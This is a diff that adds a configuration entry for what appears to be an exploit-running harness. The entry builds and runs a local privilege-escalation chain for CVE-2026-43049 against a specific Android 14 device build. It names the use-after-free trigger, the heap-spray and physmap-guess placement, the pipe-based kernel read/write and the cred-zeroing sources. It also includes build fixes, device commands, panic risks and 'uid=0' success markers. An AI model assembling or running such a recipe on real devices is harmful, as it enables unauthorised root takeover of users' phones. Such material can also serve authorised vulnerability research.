@@ -1,0 +1,98 @@
+# entry.ffwheel-guess@6.1 — CVE-2026-43049 FFWheel, read-derived ROOT (all guess).
+#
+# Same full-root two-process compose as entry.ffwheel, but BOTH halves place their
+# forge with the physmap guess (lib/addr/zoneguess) instead of the cross-cache --
+# the baseline to A/B the writer's cross-cache placement against. The reader turns
+# mm->mm_mt.ma_root + /proc/self/maps into a repeatable read, resolves the writer's
+# cred + pipe_inode_info; the writer does the pipe_buffer cred-zero write -> uid 0.
+# Probabilistic (a guess miss panics), reboot per shot; the goal is uid 0.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ffwheel-guess@6.1"
+cve    = "CVE-2026-43049"
+kmi    = ["android14-6.1"]
+
+targets = ["panther-CP2A.260705.006"]
+
+composed = false
+status   = "Root recipe (uid/gid 2000->0). Both halves place via the physmap guess; probabilistic (a miss panics), reboot-per-shot. Baseline vs entry.ffwheel's writer cross-cache."
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = ["cves/cve-2026-43049-ffwheel/ffcompose.c",
+           "cves/cve-2026-43049-ffwheel/ffread_mm.c",
+           "cves/cve-2026-43049-ffwheel/ffread_resolve.c",
+           "cves/cve-2026-43049-ffwheel/ffroot_w.c",
+           "cves/lib/spray/crosscache/crosscache.c",
+           "cves/lib/rw/pipe_rw.c",
+           "cves/lib/trigger/uhid.c",
+           "cves/lib/spray/physspray.c",
+           "cves/lib/spray/skbspray.c",
+           "cves/lib/root/kprobe_read.c",
+           "cves/lib/root/cred.c"]
+includes = ["cves"]             # resolves TARGET_HEADER
+depends  = ["cves/cve-2026-43049-ffwheel/ksnitch_mm.h",
+            "cves/cve-2026-43049-ffwheel/ffwheel_forge.h",
+            "cves/cve-2026-43049-ffwheel/ffread_resolve.h",
+            "cves/lib/spray/crosscache/crosscache.h",
+            "cves/lib/leak/kernelsnitch/kernelsnitch.h",
+            "cves/lib/root/kprobe_read.h",
+            "cves/lib/root/cred.h",
+            "cves/lib/rw/pipe_krw.h",
+            "cves/cve-2026-43049-ffwheel/ffcompose_ipc.h"]
+defines  = ["FFCOMPOSE", "KSNITCH_DETACHED_THREADS"]
+# -ffunction-sections/-fdata-sections + -Wl,--gc-sections: without them this
+# binary refuses to even exec on this device ("executable's TLS segment is
+# underaligned ... needs to be at least 64 for ARM64 Bionic") -- linking
+# crosscache.c pulls in KernelSnitch's pthread_create, which pulls in a
+# weakly-referenced GWP-ASan TLS symbol from bionic's static libc.a that
+# section GC drops (verified: PT_TLS vanishes entirely with these flags).
+# Found and fixed alongside entry.ffwheel-root@6.1, which hit the same
+# failure building the identical ffroot_w.c/crosscache.c.
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-ffunction-sections", "-fdata-sections", "-Werror"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-Wl,--gc-sections"]
+output   = "cve-2026-43049-ffwheel-guess"
+uses_target_header = true    # structure layouts and symbol offsets
+
+[properties]
+retry_safe  = true
+panic_risk  = { pre_slide = "high", post_slide = "high" }
+destructive = ["uhid UAF collateral (may panic InputReader)", "reader mm->mm_mt.ma_root overwritten (parks)", "wrong page guess -> panic"]
+restores    = []
+provides      = []
+requires_caps = []
+retains       = []
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/cve43049-ffcompose-guess"
+mode = "755"
+# No FFROOT_CROSSCACHE -> both halves use the physmap guess. Boot-stable KASLR
+# base replayed via @KASLR_ENV@ (accepts_base; ffcompose handles KASLR_LEAK_ONLY).
+command = "cd @DEV_TMP@; @KASLR_ENV@@DEV_ENTRY@ > @DEV_LOG@ 2>&1"
+accepts_base = true
+needs_root = false
+
+[markers]
+pass = '(slide-kaslr-tracefs-ok pid=[0-9]+ base=[0-9a-f]+|FFROOT_W_ROOT uid=0)'
+gate_fail = 'FFROOT_W_NO_SUCH_GATE_FAIL'
+restore_pass = 'FFROOT_W_NO_SUCH_RESTORE_PASS'
+restore_bad  = 'FFROOT_W_NO_SUCH_RESTORE_BAD'
+heartbeat    = 'FFWHEEL_HEARTBEAT seq=[0-9]+'
+diag       = '(FFROOT_W_MISS.*|no cred VA.*|no pipe_inode.*|no page_va.*|FFREAD_MISS.*)'
+diag_count = ''
+# Terminal deadlock: a half died without the handoff its peer blocks on. The
+# runner kills the shot on this instead of waiting out the writer's ~4-min
+# WAITING_FOR_PI deadline (the reboot-per-shot loop clears what it leaves).
+stall      = 'STALL: .*will time out'
+
+[provides]
+caps  = []
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# No [[setup]] -> runner default: reboot before each shot.
